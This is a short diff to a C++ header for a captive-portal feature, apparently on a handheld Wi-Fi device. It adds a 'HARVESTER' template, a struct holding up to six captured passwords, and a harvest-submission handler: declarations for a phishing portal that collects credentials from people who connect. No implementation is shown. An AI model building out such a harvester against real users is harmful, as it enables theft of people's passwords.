@@ -27,7 +27,13 @@ class CaptivePortalActivity final : public Activity {
 
  private:
   enum State { SELECT_TEMPLATE, ENTER_SSID, RUNNING, STOPPED };
-  enum Template { LANDING, FORM_TEST, DIAGNOSTICS, TEMPLATE_COUNT };
+  enum Template { LANDING, FORM_TEST, DIAGNOSTICS, HARVESTER, TEMPLATE_COUNT };
+
+  struct HarvestedCred {
+    char pass[64];
+  };
+  static constexpr int MAX_CREDS = 6;
+
   State state = SELECT_TEMPLATE;
   int selectorIndex = 0;
   Template selectedTemplate = LANDING;
@@ -35,6 +41,8 @@ class CaptivePortalActivity final : public Activity {
   std::string apSsid = "X4PRO-PORTAL";
   int pageViews = 0;
   int testSubmissions = 0;
+  HarvestedCred harvestedCreds[MAX_CREDS] = {};
+  int harvestedCount = 0;
   std::unique_ptr<WebServer> webServer;
   std::unique_ptr<DNSServer> dnsServer;
 
@@ -43,6 +51,7 @@ class CaptivePortalActivity final : public Activity {
   void stopPortal();
   void handleRoot();
   void handleTestSubmission();
+  void handleHarvestSubmission();
   void handleStatus();
   void handleNotFound();
 };
